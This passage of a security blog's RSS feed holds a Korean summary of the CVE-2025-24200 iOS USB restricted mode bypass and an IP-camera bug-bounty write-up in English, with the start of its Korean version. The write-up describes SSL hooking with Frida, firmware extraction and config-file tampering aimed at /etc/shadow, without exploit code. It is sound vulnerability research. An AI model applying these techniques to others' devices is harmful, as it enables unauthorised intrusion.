id="4-Notification-of-Results-amp-Third-Party-Objections"><a href="#4-Notification-of-Results-amp-Third-Party-Objections" class="headerlink" title="4. Notification of Results &amp; Third-Party Objections"></a><strong>4. Notification of Results &amp; Third-Party Objections</strong></h2><p>Once access restriction measures have been applied, the service provider must <strong>notify the requester</strong> of the result.</p><p>If a <strong>third party objects</strong> to the restriction, the service provider will <strong>review the submitted evidence</strong> and decide whether to uphold the restriction or lift it.</p><h2 id="5-Requesting-Access-Restriction-from-Major-Korean-Search-Engines"><a href="#5-Requesting-Access-Restriction-from-Major-Korean-Search-Engines" class="headerlink" title="5. Requesting Access Restriction from Major Korean Search Engines"></a><strong>5. Requesting Access Restriction from Major Korean Search Engines</strong></h2><p>Major Korean portal sites <strong>Naver (N)</strong> and <strong>Daum (D)</strong> provide guidance on requesting access restriction:</p><ul><li><strong>Naver Access Restriction Request Guide</strong><ul><li><a href="https://help.naver.com/service/30001/category/5759?lang=ko">https://help.naver.com/service/30001/category/5759?lang=ko</a></li></ul></li><li><strong>Daum Access Restriction Request Guide</strong><ul><li><a href="https://cs.daum.net/redbell/right/precludeProcess.html">https://cs.daum.net/redbell/right/precludeProcess.html</a></li></ul></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/right/">right</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/22/romi0x/right-to-be-forgotten-en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-24200: iOS 및 iPadOS의 제품명의 잘못된 권한 관리로 인한 USB restricted mode 비활성화 취약점</title>
      <link>https://hackyboiz.github.io/2025/02/21/hunjison/CVE-2025-24200/</link>
      <guid>https://hackyboiz.github.io/2025/02/21/hunjison/CVE-2025-24200/</guid>
      <pubDate>Fri, 21 Feb 2025 02:40:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.quarkslab.com/first-analysis-of-apples</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://blog.quarkslab.com/first-analysis-of-apples-usb-restricted-mode-bypass-cve-2025-24200.html">https://blog.quarkslab.com/first-analysis-of-apples-usb-restricted-mode-bypass-cve-2025-24200.html</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>iOS 18.3.1 and iPadOS 18.3.1 &#xC774;&#xD558; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><strong>USB restricted mode&#xB780;?</strong></p><p>USB restricted mode&#xB294; iOS 11.4.1&#xC5D0;&#xC11C; &#xB3C4;&#xC785;&#xB41C; &#xBCF4;&#xC548; &#xAE30;&#xB2A5;&#xC73C;&#xB85C;, &#xC7A5;&#xCE58;&#xAC00; &#xC7A0;&#xAE34; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; 1&#xC2DC;&#xAC04; &#xC774;&#xC0C1; &#xACBD;&#xACFC;&#xD558;&#xBA74; &#xB370;&#xC774;&#xD130; &#xD3EC;&#xD2B8;(&#xB77C;&#xC774;&#xD2B8;&#xB2DD; &#xD3EC;&#xD2B8;)&#xB97C; &#xD1B5;&#xD55C; &#xC5F0;&#xACB0;&#xC744; &#xCC28;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; Cellebrite&#xB098; GrayKey&#xC640; &#xAC19;&#xC740; &#xD3EC;&#xB80C;&#xC2DD; &#xB3C4;&#xAD6C;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xBB34;&#xB2E8; &#xB370;&#xC774;&#xD130; &#xCD94;&#xCD9C;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p><strong>&#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;</strong></p><p>CVE-2025-24200&#xC740; Apple&#xC758; &#xC811;&#xADFC;&#xC131; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xC778;&#xC99D; &#xBB38;&#xC81C;&#xB85C;, Citizen Lab&#xC758; Bill Marczak&#xC5D0; &#xC758;&#xD574; &#xBCF4;&#xACE0;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC7A0;&#xAE34; &#xC7A5;&#xCE58;&#xC5D0;&#xC11C; USB restricted mode&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xBA70;, Apple&#xC740; &#xC774; &#xBB38;&#xC81C;&#xAC00; &#xD2B9;&#xC815; &#xAC1C;&#xC778;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD55C; &#xB9E4;&#xC6B0; &#xC815;&#xAD50;&#xD55C; &#xACF5;&#xACA9;&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xB418;&#xC5C8;&#xC744; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC778;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Quarkslab&#xC758; &#xBD84;&#xC11D;&#xC5D0; &#xB530;&#xB974;&#xBA74;, &#xC774;&#xBC88; &#xD328;&#xCE58;&#xC5D0;&#xC11C; &#xBCC0;&#xACBD;&#xB41C; &#xC810;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. <code>setParametersForSettingsByType</code> &#xD638;&#xCD9C; &#xC9C1;&#xC804; <code>restriced_mode_allowed</code> &#xC870;&#xAC74;&#xC744; &#xD55C; &#xBC88; &#xB354; &#xAC80;&#xC99D;&#xD574; &#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xC0DD;&#xC744; &#xB9C9;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/02/21/hunjison/CVE-2025-24200/1.png" alt></p><p>Quarkslab&#xC740; <code>assistivetouchd</code>&#xC758; <code>_setUSBRMPreferenceDisabled</code> &#xD568;&#xC218;&#xB97C; attack vector&#xB85C; &#xD30C;&#xC545;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; USB restricted mode&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; <code>handleUSBMFiDeviceConnected</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370;, MFi (Made for iPhone certified) &#xC778;&#xC99D;&#xC744; &#xBC1B;&#xC740; &#xAE30;&#xAE30;&#xB97C; &#xC5F0;&#xACB0;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/02/21/hunjison/CVE-2025-24200/2.png" alt></p><p>&#xC2E4;&#xC81C;&#xB85C; &#xADF8;&#xB4E4;&#xC774; <code>frida</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; <code>handleUSBMFiDeviceConnected</code> &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF30;&#xC744; &#xB54C;, &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC740; &#xD31D;&#xC5C5;&#xC774; &#xB098;&#xC654;&#xC73C;&#xBA70;, OK &#xBC84;&#xD2BC;&#xC744; &#xB204;&#xB974;&#xBA74; USB restricted mode&#xAC00; &#xD574;&#xC81C;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/02/21/hunjison/CVE-2025-24200/3.png" alt></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/hunjison/">hunjison</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apple/">Apple</category>
      
      <category domain="https://hackyboiz.github.io/tags/iOS/">iOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/iPadOS/">iPadOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Incorrect-authrization/">Incorrect authrization</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/21/hunjison/CVE-2025-24200/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] One day.. I got an IPCAM (en)</title>
      <link>https://hackyboiz.github.io/2025/02/16/hunjison/IPCAM/en/</link>
      <guid>https://hackyboiz.github.io/2025/02/16/hunjison/IPCAM/en/</guid>
      <pubDate>Sun, 16 Feb 2025 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;hr&gt;
&lt;p&gt;Hello, this is &lt;code&gt;hunjison&lt;/code&gt;. While studying hacking, I always felt something was missing&amp;#x2014;namely, the fact that I had</description>
        
      
      
      
      <content:encoded><![CDATA[<hr><p>Hello, this is <code>hunjison</code>. While studying hacking, I always felt something was missing&#x2014;namely, the fact that I had never discovered a CVE.</p><p>Then one day&#x2026; I heard an interesting story from <code>OUYA77</code>.</p><p>Dun&#x2026; Dun&#x2026;!! It turns out that KISA was running a 1.5x payout event for IP CAM vulnerabilities.</p><p>After seeing this, every IP CAM started looking like money to me. Of course, I also thought this would be a great opportunity to earn a CVE.</p><p><img src="image.png" alt="image.png"></p><h1 id="IP-CAM-Target-Search"><a href="#IP-CAM-Target-Search" class="headerlink" title="IP CAM Target Search"></a>IP CAM Target Search</h1><p>Together with <code>OUYA77</code>, we immediately began narrowing down a list of IP CAM products. Home IP CAMs ranged from 20,000 to 100,000 KRW, while enterprise-grade IP CAMs varied from 200,000 KRW to over a million.</p><p>Since we were not rich but wanted to make money, we decided to buy multiple home IP CAMs!</p><p>We specifically selected products with numerous attack vectors, especially focusing on external interfaces. Here are the interfaces we identified:</p><ul><li>Wi-Fi (AP)</li><li><strong>App (iOS/Android &#x2192; IP CAM)</strong></li><li><strong>Windows program</strong></li><li>External cloud storage</li><li>Ethernet</li><li>SD Card</li><li>USB</li></ul><p>Most modern IP CAMs include most of these interfaces, making them somewhat similar in structure. Additionally, we considered whether firmware could be obtained online.</p><p>In the end, we purchased four small and adorable IP CAMs. Among them, I will introduce our analysis of two devices.</p><h1 id="Target-A"><a href="#Target-A" class="headerlink" title="Target A"></a>Target A</h1><h2 id="1-Initial-Exploration"><a href="#1-Initial-Exploration" class="headerlink" title="#1 - Initial Exploration"></a>#1 - Initial Exploration</h2><p>Target A had two user interfaces: an app (iOS/Android) and a Windows EXE. Below are the initial findings from our analysis:</p><ul><li><strong>App:</strong><ul><li>Requires account registration/login and appears to transmit data from the app to a server.</li><li>Device registration involves scanning a QR code from the app, which contains Wi-Fi credentials.</li><li>Once registered, the user can watch video feeds.</li></ul></li><li><strong>Windows Program:</strong><ul><li>Requires account registration/login and tran smits data to a server.</li><li>After logging in, it automatically scans for devices on the LAN, registering them based on serial numbers.</li><li>If not logged in, it can still scan the LAN for devices and watch video feeds.</li></ul></li><li><strong>Firmware Download:</strong><ul><li>Found a method via publicly available blog posts.</li><li>Could be downloaded from the official website using a <code>/device/{device-model}/{device-model}</code> URL structure.</li><li>Using <code>binwalk</code>, we confirmed that the firmware used a <code>squashfs</code> file system and extracted the files.</li></ul></li></ul><h2 id="2-Windows-EXE-Analysis"><a href="#2-Windows-EXE-Analysis" class="headerlink" title="#2 - Windows EXE Analysis"></a>#2 - Windows EXE Analysis</h2><p>We aimed to analyze the Windows program to answer the following questions:</p><ul><li>What data is exchanged with the server when the login button is pressed?</li><li>What authentication protocol is used when the video playback button is pressed?</li></ul><p>We first attempted network analysis using Wireshark.</p><ul><li>Due to TLS encryption, the packets were unreadable.</li><li>Just as browsers allow TLS decryption via <code>SSLKEYLOGFILE</code>, we attempted dynamic debugging of the program&#x2019;s TLS logic to extract key files.</li><li>However, reversing the TLS structure turned out to be difficult, so we sought an alternative approach.</li></ul><p>Fortunately, I had prior experience with the Frida framework, so we used Frida to hook SSL-related encryption and decryption functions.</p><ul><li>Identified SSL-related functions imported by the Windows EXE.</li><li>Extracted argument values and return buffers based on static analysis. The right-hand image shows an HTTP 200 response!</li></ul><p><img src="image%201.png" alt="image.png"></p><p>Using the Frida hooking method, we gained some insights into how the Windows EXE operates.</p><h3 id="2-1-Watching-Video-After-User-Login-WAN-Network"><a href="#2-1-Watching-Video-After-User-Login-WAN-Network" class="headerlink" title="#2.1 - Watching Video After User Login (WAN Network)"></a>#2.1 - Watching Video After User Login (WAN Network)</h3><p>When the Windows program and IP CAM are on different networks (WAN), they communicate through a server, as shown below:</p><ul><li>Once TLS decryption is disabled, the server receives the user&#x2019;s password.</li><li>If authentication is successful, the server sends video data.</li></ul><p><img src="image%202.png" alt="image.png"></p><p>However, the TLS 1.2 encrypted communication between the IP CAM and server was not decryptable. Only certain cipher suites using RSA are known to have vulnerabilities, but the target IP CAM used <code>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</code>, making MITM attacks impossible.</p><h3 id="See-Also-Packet-Sniffing-with-a-Wi-Fi-Dongle"><a href="#See-Also-Packet-Sniffing-with-a-Wi-Fi-Dongle" class="headerlink" title="[See Also] Packet Sniffing with a Wi-Fi Dongle"></a>[See Also] Packet Sniffing with a Wi-Fi Dongle</h3><p>To capture packets exchanged between the IP CAM and server, we used a Wi-Fi dongle. Typically, dongles enable Wi-Fi on devices without built-in Wi-Fi, but we repurposed one to rebroadcast Ethernet as Wi-Fi.</p><ul><li>As shown below, the dongle functions like a router.</li><li>By selecting the dongle&#x2019;s network interface in Wireshark, we captured all packets sent to the IP CAM.</li></ul><p><img src="image%203.png" alt="image.png"></p><h3 id="2-2-Watching-Video-After-User-Login-LAN-Network"><a href="#2-2-Watching-Video-After-User-Login-LAN-Network" class="headerlink" title="#2.2 - Watching Video After User Login (LAN Network)"></a>#2.2 - Watching Video After User Login (LAN Network)</h3><p>An interesting logic was discovered in the LAN network. When I confirmed that the Windows EXE and IP CAM were encrypting data using a LAN encryption key, I naturally assumed it was a fixed key. That was my mistake&#x2014;I underestimated Target A.</p><p>As shown in the diagram below, when a user logs in, the server issues a JWT token, which is then used to deliver the LAN encryption key. It is assumed that a similar mechanism is used between the server and the IP CAM.</p><p><img src="image%204.png" alt="image.png"></p><h3 id="2-3-Watching-Video-Without-User-Login-LAN-Network"><a href="#2-3-Watching-Video-Without-User-Login-LAN-Network" class="headerlink" title="#2.3 - Watching Video Without User Login (LAN Network)"></a>#2.3 - Watching Video Without User Login (LAN Network)</h3><p>Target A had a feature that allowed scanning and watching videos on the LAN without logging in. However, a user password was required to access the video stream.</p><ul><li>The Windows EXE cached successful passwords so that users wouldn&#x2019;t have to re-enter them repeatedly. I mistakenly thought I had found a vulnerability, but right before writing the report, I realized I had misunderstood the caching mechanism.</li></ul><p><img src="image%205.png" alt="image.png"></p><h3 id="2-4-Watching-Video-Without-User-Login-RTSP-Protocol"><a href="#2-4-Watching-Video-Without-User-Login-RTSP-Protocol" class="headerlink" title="#2.4 - Watching Video Without User Login (RTSP Protocol)"></a>#2.4 - Watching Video Without User Login (RTSP Protocol)</h3><p>Target A also supported the RTSP protocol. RTSP (Real-Time Streaming Protocol) is used to stream multimedia data such as audio and video over a network. I was able to identify Target A&#x2019;s RTSP URL through an online blog post.</p><ul><li>In older versions of Target A, <strong>a six-digit device code was used as the RTSP password</strong>. However, the latest version patched this by requiring users to set a password during device registration.</li></ul><p><img src="image%206.png" alt="image.png"></p><h2 id="3-API-Server"><a href="#3-API-Server" class="headerlink" title="#3 - API Server"></a>#3 - API Server</h2><p>While hooking the Windows EXE with Frida, I discovered the API server&#x2019;s address. This server provided the same functionality as the Windows program but was only accessible via Internet Explorer. It was an extremely outdated website.</p><ul><li>The server supported user registration, device registration, and password changes, just like the Windows program.</li><li>I considered testing various possibilities, but I stopped after realizing it was outside the scope of the bug bounty program.</li></ul><h2 id="4-Firmware-Analysis"><a href="#4-Firmware-Analysis" class="headerlink" title="#4 - Firmware Analysis"></a>#4 - Firmware Analysis</h2><p>As mentioned earlier, we acquired the firmware early in our research. We focused on the following areas but did not find any vulnerabilities:</p><ul><li><strong>Command Injection:</strong> We examined processes that accepted system commands as parameters but found no exploitable weaknesses.</li><li><strong>BOF / DoS Attacks:</strong> We checked whether input length validation was properly implemented in user request handling but found nothing exploitable.</li></ul><h2 id="5-Result"><a href="#5-Result" class="headerlink" title="#5 - Result"></a>#5 - Result</h2><p>Our analysis of Target A primarily focused on the Windows EXE, testing various scenarios. Unfortunately, we did not discover any vulnerabilities. One thing that stood out was that this product had likely been analyzed by many hackers before.</p><ul><li>The four scenarios analyzed in <strong>Section #2</strong> applied secure encryption methods. I doubt it was designed this way from the beginning.</li><li>Input length validation for buffer overflow (BOF) attacks was abnormally strict.</li></ul><p><img src="image%207.png" alt="image.png"></p><hr><h1 id="Target-B"><a href="#Target-B" class="headerlink" title="Target B"></a>Target B</h1><h2 id="1-Initial-exploration"><a href="#1-Initial-exploration" class="headerlink" title="#1 - Initial exploration"></a>#1 - Initial exploration</h2><p>Target B&#x2019;s user interface includes an App (iOS/Android) and a Windows EXE. While analyzing the network traffic of the Windows EXE, we identified a Web Interface on the IP CAM&#x2019;s IP address.</p><ul><li><strong>App</strong><ul><li>Initial setup instructions appeared weak in security.</li><li>During device registration, the mobile device connects to the IP CAM&#x2019;s Wi-Fi, and the mobile device&#x2019;s Wi-Fi credentials are transmitted to complete the initial registration.</li><li>After registration, users can watch live video streams.</li><li>Additional features include recording, cloud uploads, camera pan/tilt/zoom, and buzzer activation.</li></ul></li><li><strong>Windows EXE</strong><ul><li>Can discover and register devices on the local network.</li><li>Offers limited functionality.</li></ul></li><li><strong>Web Interface</strong><ul><li>A CGI-based website accessible via the IP CAM&#x2019;s IP address. Authentication via user password is required. The poor UI suggests many potential vulnerabilities!</li><li>Provides most of the features available in the App.</li><li><strong>Includes system configuration backup/load and firmware update functionality.</strong></li></ul></li></ul><h2 id="2-Web-Interface"><a href="#2-Web-Interface" class="headerlink" title="#2 - Web Interface"></a>#2 - Web Interface</h2><h3 id="2-1-System-configuration-backup-load"><a href="#2-1-System-configuration-backup-load" class="headerlink" title="#2.1 - System configuration backup/load"></a>#2.1 - System configuration backup/load</h3><p>The Web Interface allows users to back up (IP CAM &#x2192; PC download) and load (PC &#x2192; IP CAM) system configuration files. The binary file structure is as follows:</p><ul><li><strong>Header (0x200)</strong><ul><li>Contains an MD5 hash.</li></ul></li><li><strong>Body</strong><ul><li>TAR structure.</li></ul></li></ul><p>Identifying the TAR structure in the BODY field allowed us to extract file paths and original data. If we modified the structure to insert our own data at <code>/etc/shadow</code>, overwriting the system file should theoretically be possible.</p><p><img src="image%208.png" alt="image.png"></p><p>However, the issue was the MD5 hash. While the length matched that of an MD5 hash, the computed value did not match. Later, we found a 2019 post detailing how someone successfully modified the MD5 value to change the root password of the same IP CAM model.</p><p>This clearly suggests that the vulnerability was reported and patched. &#x1F602; As we later discovered during firmware extraction, the MD5 hash calculation method appears to have been repeatedly updated by security researchers.</p><h3 id="2-2-Firmware-update"><a href="#2-2-Firmware-update" class="headerlink" title="#2.2 - Firmware update"></a>#2.2 - Firmware update</h3><p>We downloaded the firmware from the manufacturer&#x2019;s website. Although it appeared to be in a standard ZIP format, it could not be extracted properly. Upon inspection, we found some customized modifications to the ZIP structure.</p><p>By following the ZIP format and adjusting our script accordingly, we managed to modify parts of the binary and successfully extract the firmware (although some errors prevented full extraction).</p><p><img src="image%209.png" alt="[https://blog.forensicresearch.kr/3](https://blog.forensicresearch.kr/3)"></p><p><a href="https://blog.forensicresearch.kr/3">https://blog.forensicresearch.kr/3</a></p><p>During our analysis, we also discovered a way to access an archive of firmware versions from the manufacturer&#x2019;s website. We analyzed the firmware using the following methods:</p><ul><li><strong>ZIP structure analysis</strong><ul><li>Adjusted scripts to match the ZIP format and extract firmware.</li></ul></li><li><strong>Main binary reverse engineering</strong><ul><li>Reversed the logic used to generate system config files (which have the same structure as the firmware) to track changes over time.</li></ul></li></ul><p><img src="b6c855a3-b38e-402f-bffd-ea5f99fa942b.png" alt="image.png"></p><p>Through this analysis, we identified how firmware updates had evolved. The changes suggest continuous involvement from security researchers&#x2026; quite impressive!</p><ul><li><strong>ZIP file structure modifications</strong><ul><li>Initially, file signatures were simply altered to obscure their format.</li><li>Later, parts of the file were partially encrypted.</li><li>In the latest versions, the entire file appears to be encrypted.</li></ul></li><li><strong>MD5 hash generation logic</strong><ul><li>Initially, it was <code>MD5(BODY)</code>.</li><li>Later, it changed to <code>MD5(BODY + &quot;secret string&quot;)</code>.</li><li>The current method remains unknown.</li></ul></li><li><strong>Firmware file upload location</strong><ul><li>From 2017 to 2021, firmware was uploaded to the manufacturer&#x2019;s website.</li><li>Since then, firmware updates have been distributed via a backend connected to the App.</li></ul></li></ul><h2 id="3-App"><a href="#3-App" class="headerlink" title="#3 - App"></a>#3 - App</h2><p>Since we did not have a rooted Android phone, we only analyzed the App at the network level. (Okay, fine, we were just too lazy to go deeper. &#x1F606;) However, since we had an iPhone, we captured network packets as follows:</p><ul><li>A quick Google search revealed that connecting a MacBook to an iPhone allows for iPhone packet capture.</li></ul><p><img src="image%2010.png" alt="[https://lxxyeon.tistory.com/157](https://lxxyeon.tistory.com/157)"></p><p><a href="https://lxxyeon.tistory.com/157">https://lxxyeon.tistory.com/157</a></p><p>Analyzing the captured packets between the iPhone and the IP CAM, we observed the following communication process:</p><ul><li>When the IP CAM is powered on, it periodically communicates with the server, sending its IP address and a port number that changes every minute.</li><li>When the user launches the App, it sends a communication request to the server. The server then relays the request to the IP CAM using the stored IP/port information, including the user&#x2019;s IP/port data.<ul><li>The IP CAM receives this information and sends a connection request to the user.</li></ul></li></ul><p><img src="image%2011.png" alt="image.png"></p><p>Examining publicly available attack cases against Target B, we found that attackers typically followed these steps:</p><ul><li>Performed a chip-off extraction of the flash memory and dumped the firmware.</li><li>Analyzed the binary and identified a buffer overflow (BOF) vulnerability.</li><li>Exploited the BOF to achieve remote code execution (RCE) and gain a shell.</li></ul><p><img src="image%2012.png" alt="image.png"></p><p>If we were to start analyzing the IP CAM from scratch, we would follow their approach and extract the firmware directly from the flash memory. Through this project, we realized the absolute importance of obtaining firmware and setting up a dynamic debugging environment.</p><ul><li>Seriously, this is <strong>the most important part</strong>.</li></ul><h2 id="4-Windows-EXE"><a href="#4-Windows-EXE" class="headerlink" title="#4 - Windows EXE"></a>#4 - Windows EXE</h2><p>Although the logic of the Windows EXE was simple, what stood out was that the App and the Windows EXE used completely different protocols. Since the IP CAM supports multiple protocols, this suggests that many vulnerabilities could potentially be found if explored further.</p><p><img src="image%2013.png" alt="image.png"></p><hr><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Over approximately three months (Nov 2024 &#x2013; Jan 2025), I analyzed four IP CAMs, including the two described in this post. As this was my first experience analyzing IoT devices, I encountered many challenges. In particular, I was not very familiar with Windows EXE analysis and network protocol analysis.</p><p>Despite this, I learned several key lessons from this project:</p><ul><li>Some targets are more vulnerable than others. Devices that have been extensively analyzed by hackers tend to have a much higher security level.</li><li>Many of the most basic vulnerabilities in IP CAMs seem to have been patched.</li><li>IoT device analysis requires a broad range of foundational knowledge, including Windows EXE static and dynamic analysis, network protocol analysis, socket programming, web hacking, system hacking, and even hardware-based approaches.</li><li>Extracting firmware and setting up a dynamic debugging environment should always be the top priority.</li></ul><p><img src="image%2014.png" alt="image.png"></p><p>Thank you for reading!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/hunjison/">hunjison</category>
      
      <category domain="https://hackyboiz.github.io/tags/Bug-Bounty/">Bug Bounty</category>
      
      <category domain="https://hackyboiz.github.io/tags/IP-CAMERA/">IP CAMERA</category>
      
      <category domain="https://hackyboiz.github.io/tags/IoT/">IoT</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/16/hunjison/IPCAM/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 어느날 IP CAM이 내게 주어진다면 (ko)</title>
      <link>https://hackyboiz.github.io/2025/02/16/hunjison/IPCAM/ko/</link>
      <guid>https://hackyboiz.github.io/2025/02/16/hunjison/IPCAM/ko/</guid>
      <pubDate>Sun, 16 Feb 2025 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;hr&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, hunjison&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC800;&amp;#xB294; &amp;#xD574;&amp;#xD0B9; &amp;#xACF5;&amp;#xBD80</description>
        
      
      
      
      <content:encoded><![CDATA[<hr><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, hunjison&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xB294; &#xD574;&#xD0B9; &#xACF5;&#xBD80;&#xB97C; &#xD558;&#xBA74;&#xC11C; &#xD56D;&#xC0C1; &#xC544;&#xC26C;&#xC6E0;&#xB358; &#xC810;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xBC14;&#xB85C; CVE&#xAC00; &#xD558;&#xB098;&#xB3C4; &#xC5C6;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB358; &#xC5B4;&#xB290; &#xB0A0;,,, <code>OUYA77</code> &#xC5D0;&#xAC8C; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xC774;&#xC57C;&#xAE30;&#xB97C; &#xD558;&#xB098; &#xB4E3;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB450;&#x2026;.&#xB465;..!! &#xBC14;&#xB85C; KISA&#xC5D0;&#xC11C; IP CAM 1.5 &#xBC30; &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xC5C8;&#xB294;&#xB370;&#xC694;.</p><p>&#xC774;&#xAC78; &#xBCF4;&#xACE0; &#xBD80;&#xD130;&#xB294; &#xBAA8;&#xB4E0; IP CAM&#xC774; &#xB3C8;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xC798;&#xD558;&#xBA74; CVE&#xB3C4; &#xBC1C;&#xAE09; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xACA0;&#xB2E4; &#xC0DD;&#xAC01;&#xD588;&#xC8E0;.</p><p><img src="image.png" alt="image.png"></p><h1 id="IP-CAM-target-search"><a href="#IP-CAM-target-search" class="headerlink" title="IP CAM target search"></a>IP CAM target search</h1><p><code>OUYA77</code>&#xACFC; &#xD568;&#xAED8; &#xBC14;&#xB85C; IP CAM &#xC81C;&#xD488;&#xAD70; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xCD94;&#xB9AC;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xC815;&#xC6A9; IP CAM&#xC740; 2&#xB9CC;&#xC6D0;&#xC5D0;&#xC11C; 10&#xB9CC;&#xC6D0; &#xC815;&#xB3C4;&#xC758; &#xAC00;&#xACA9;&#xB300;&#xC600;&#xACE0;, &#xAE30;&#xC5C5;&#xC6A9; IP CAM&#xC740; 20&#xB9CC;&#xC6D0;&#xB300;&#xBD80;&#xD130; 100&#xB9CC;&#xC6D0;&#xC774; &#xB118;&#xB294; &#xAC83;&#xAE4C;&#xC9C0; &#xB2E4;&#xC591;&#xD588;&#xC5B4;&#xC694;.</p><p>&#xC800;&#xD76C;&#xB294; &#xAC00;&#xB09C;&#xD588;&#xACE0; &#xB3C8;&#xC740; &#xB9CE;&#xC774; &#xBC8C;&#xACE0; &#xC2F6;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAC00;&#xC815;&#xC6A9; IP CAM&#xC744; &#xC5EC;&#xB7EC; &#xAC1C; &#xC0AC;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xADF8; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; &#xC678;&#xBD80; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xC704;&#xC8FC;&#xB85C; Attack vector&#xAC00; &#xB9CE;&#xC740; &#xC81C;&#xD488;&#xC744; &#xC120;&#xC815;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C;&#xAC00; 